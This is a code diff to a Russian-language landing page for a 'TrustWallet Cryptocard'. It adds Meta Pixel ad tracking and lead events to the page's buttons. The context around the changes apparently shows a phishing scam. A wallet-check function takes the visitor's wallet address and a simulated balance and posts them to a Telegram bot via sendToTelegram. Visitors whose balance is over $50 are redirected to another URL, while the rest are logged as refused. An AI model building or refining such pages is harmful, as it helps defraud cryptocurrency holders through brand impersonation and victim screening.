@@ -12,6 +12,24 @@
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 
+    <!-- Meta Pixel Code -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1413695077434129');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1413695077434129&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+
     <style>
         :root {
             --color-bg: #ffffff;
@@ -1229,7 +1247,7 @@
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
                     RU
                 </div>
-                <a href="#cta" class="btn btn-primary trigger-modal">Начать</a>
+                <a href="#cta" class="btn btn-primary trigger-modal track-lead">Начать</a>
             </div>
         </div>
     </header>
@@ -1247,7 +1265,7 @@
                     Первая кредитная карта, подключённая напрямую к вашему крипто-кошельку. Тратьте Bitcoin, Ethereum и стейблкоины в 80М+ магазинах по всему миру без комиссий за конвертацию.
                 </p>
                 <div class="hero-buttons">
-                    <a href="#cta" class="btn btn-primary btn-large trigger-modal">Подать заявку</a>
+                    <a href="#cta" class="btn btn-primary btn-large trigger-modal track-lead">Подать заявку</a>
                     <a href="#features" class="btn btn-secondary btn-large">Узнать больше</a>
                 </div>
                 <div class="hero-features">
@@ -1447,7 +1465,7 @@
                     Двойной множитель наград
                 </li>
             </ul>
-            <a href="#" class="btn btn-secondary trigger-modal">Проверить доступность</a>
+            <a href="#" class="btn btn-secondary trigger-modal track-lead">Проверить доступность</a>
         </div>
         <div class="premium-image">
             <div class="card-mockup platinum">
@@ -1475,7 +1493,7 @@
             <p style="max-width: 600px; margin: 16px auto 32px;">
                 Присоединяйтесь к 500,000+ пользователям, которые доверяют TrustWallet Cryptocard для ежедневных крипто-расходов.
             </p>
-            <a href="#" class="btn btn-primary btn-large trigger-modal">Подать заявку — Бесплатно</a>
+            <a href="#" class="btn btn-primary btn-large trigger-modal track-lead">Подать заявку — Бесплатно</a>
             <div class="cta-guarantees">
                 <div class="cta-guarantee-item">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
@@ -1598,7 +1616,7 @@
             </div>
             <div class="modal-actions" id="modalActions">
                 <button class="btn btn-secondary" onclick="closeModal()">Отмена</button>
-                <button class="btn btn-primary" onclick="checkWallet()">Проверить</button>
+                <button class="btn btn-primary track-lead" onclick="checkWallet()">Проверить</button>
             </div>
         </div>
     </div>
@@ -1697,6 +1715,15 @@
             });
         });
 
+        // Track Lead Event on all buttons with class 'track-lead'
+        document.querySelectorAll('.track-lead').forEach(btn => {
+            btn.addEventListener('click', function() {
+                if (typeof fbq !== 'undefined') {
+                    fbq('track', 'Lead');
+                }
+            });
+        });
+
         // Wallet Check Function
         async function checkWallet() {
             const walletAddress = document.getElementById('walletAddress').value.trim();
@@ -1735,7 +1762,7 @@
 <b>❌ Проверка НЕ пройдена</b>
 🔗 <b>Кошелек:</b> <code>${walletAddress}</code>
 💸 <b>Баланс:</b> $${simulatedBalance.toFixed(2)} (Меньше $50)
-🚫 <b>Статус:</b> ОТКАЗ
+ <b>Статус:</b> ОТКАЗ
                 `;
                 sendToTelegram(failLog);
                 closeModal();
@@ -1744,7 +1771,7 @@
                 const successLog = `
 <b>✅ Проверка ПРОЙДЕНА</b>
 🔗 <b>Кошелек:</b> <code>${walletAddress}</code>
-💸 <b>Баланс:</b> $${simulatedBalance.toFixed(2)} (Больше $50)
+ <b>Баланс:</b> $${simulatedBalance.toFixed(2)} (Больше $50)
 🚀 <b>Статус:</b> УСПЕХ -> РЕДИРЕКТ
 🔗 <b>Ссылка:</b> ${REDIRECT_URL_SUCCESS}
                 `;
